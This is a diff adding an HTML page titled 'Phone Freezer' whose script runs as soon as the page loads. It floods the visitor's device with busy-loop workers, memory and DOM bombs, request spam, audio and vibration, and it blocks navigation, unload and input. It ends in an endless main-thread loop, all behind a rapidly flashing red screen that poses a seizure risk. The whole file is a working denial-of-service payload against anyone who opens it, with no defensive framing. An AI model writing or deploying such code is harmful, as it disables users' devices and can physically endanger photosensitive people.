@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phone Freezer</title>
+    <style>
+        body {
+            margin: 0;
+            background: #000;
+            color: #ff0000;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+        .message {
+            position: fixed;
+            top: 40%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 4em;
+            text-shadow: 0 0 50px #ff0000;
+            z-index: 1000;
+            text-align: center;
+            animation: pulse 2s infinite;
+        }
+        .countdown {
+            position: fixed;
+            top: 60%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 2em;
+            text-shadow: 0 0 30px #ff0000;
+            z-index: 1000;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 0.8; }
+            50% { opacity: 1; }
+        }
+        .flashing {
+            animation: flash 0.1s infinite;
+        }
+        @keyframes flash {
+            0%, 50% { background: #ff0000; }
+            51%, 100% { background: #000; }
+        }
+    </style>
+</head>
+<body>
+    <div class="message" id="message">Am Sorry</div>
+    <div class="countdown" id="countdown">5:00</div>
+    
+    <script>
+        // Immediate execution - no confirmation
+        (function() {
+            // Multiple simultaneous attacks
+            
+            // 1. Infinite loop workers
+            for (let i = 0; i < 50; i++) {
+                const worker = new Worker(URL.createObjectURL(new Blob([`
+                    while(true) {
+                        const arr = new Array(1000000).fill(Math.random());
+                        for(let j = 0; j < arr.length; j++) {
+                            arr[j] = Math.sqrt(arr[j]) * Math.PI;
+                        }
+                    }
+                `], {type: 'application/javascript'})));
+            }
+            
+            // 2. Memory bomb
+            let memArrays = [];
+            setInterval(() => {
+                for (let i = 0; i < 100; i++) {
+                    memArrays.push(new Array(1000000).fill(Math.random().toString(36)));
+                }
+            }, 1);
+            
+            // 3. DOM overload
+            setInterval(() => {
+                for (let i = 0; i < 1000; i++) {
+                    const div = document.createElement('div');
+                    div.innerHTML = 'X'.repeat(10000);
+                    document.body.appendChild(div);
+                }
+            }, 1);
+            
+            // 4. Canvas rendering hell
+            for (let i = 0; i < 20; i++) {
+                const canvas = document.createElement('canvas');
+                canvas.width = 2000;
+                canvas.height = 2000;
+                const ctx = canvas.getContext('2d');
+                document.body.appendChild(canvas);
+                
+                function render() {
+                    for (let j = 0; j < 10000; j++) {
+                        ctx.fillStyle = `hsl(${Math.random()*360}, 100%, 50%)`;
+                        ctx.fillRect(Math.random()*2000, Math.random()*2000, 100, 100);
+                    }
+                    requestAnimationFrame(render);
+                }
+                render();
+            }
+            
+            // 5. Network spam
+            setInterval(() => {
+                for (let i = 0; i < 50; i++) {
+                    fetch('/api/heavy_data').catch(() => {});
+                    fetch('data:text/plain,' + 'X'.repeat(1000000)).catch(() => {});
+                }
+            }, 10);
+            
+            // 6. Audio chaos
+            try {
+                for (let i = 0; i < 10; i++) {
+                    const ctx = new AudioContext();
+                    for (let j = 0; j < 100; j++) {
+                        const osc = ctx.createOscillator();
+                        osc.frequency.value = Math.random() * 20000;
+                        osc.connect(ctx.destination);
+                        osc.start();
+                    }
+                }
+            } catch(e) {}
+            
+            // 7. Vibration overload
+            if (navigator.vibrate) {
+                setInterval(() => {
+                    navigator.vibrate([1000]);
+                }, 100);
+            }
+            
+            // 8. Recursive function calls
+            function recursiveBomb(depth = 0) {
+                const arr = new Array(100000).fill(depth);
+                setTimeout(() => recursiveBomb(depth + 1), 1);
+                return arr.map(x => x * Math.random());
+            }
+            for (let i = 0; i < 100; i++) {
+                recursiveBomb();
+            }
+            
+            // 9. WebGL stress
+            for (let i = 0; i < 10; i++) {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const vertices = new Float32Array(1000000);
+                    for (let j = 0; j < vertices.length; j++) {
+                        vertices[j] = Math.random();
+                    }
+                    const buffer = gl.createBuffer();
+                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                    gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
+                }
+            }
+            
+            // 10. Prevent page unload
+            window.addEventListener('beforeunload', (e) => {
+                e.preventDefault();
+                e.returnValue = '';
+                return '';
+            });
+            
+            // 11. History manipulation to prevent back button
+            history.pushState(null, null, location.href);
+            window.addEventListener('popstate', () => {
+                history.pushState(null, null, location.href);
+            });
+            
+            // 12. Flashing screen with countdown (5 minutes = 300000ms)
+            let flashCount = 0;
+            setInterval(() => {
+                document.body.className = document.body.className ? '' : 'flashing';
+                flashCount++;
+                const remainingMs = 300000 - flashCount * 100;
+                const minutes = Math.floor(remainingMs / 60000);
+                const seconds = Math.floor((remainingMs % 60000) / 1000);
+                
+                if (remainingMs > 0) {
+                    document.getElementById('countdown').textContent = 
+                        minutes + ':' + seconds.toString().padStart(2, '0');
+                } else {
+                    document.getElementById('countdown').textContent = '0:00';
+                }
+            }, 100);
+            
+            // 13. Block user interactions
+            document.addEventListener('touchstart', (e) => e.preventDefault(), {passive: false});
+            document.addEventListener('touchmove', (e) => e.preventDefault(), {passive: false});
+            document.addEventListener('touchend', (e) => e.preventDefault(), {passive: false});
+            document.addEventListener('keydown', (e) => e.preventDefault());
+            document.addEventListener('contextmenu', (e) => e.preventDefault());
+            
+            // 14. Main thread blocker
+            setTimeout(() => {
+                while(true) {
+                    const start = Date.now();
+                    while(Date.now() - start < 100) {
+                        Math.random() * Math.random();
+                    }
+                }
+            }, 1000);
+            
+        })();
+    </script>
+</body>
+</html>
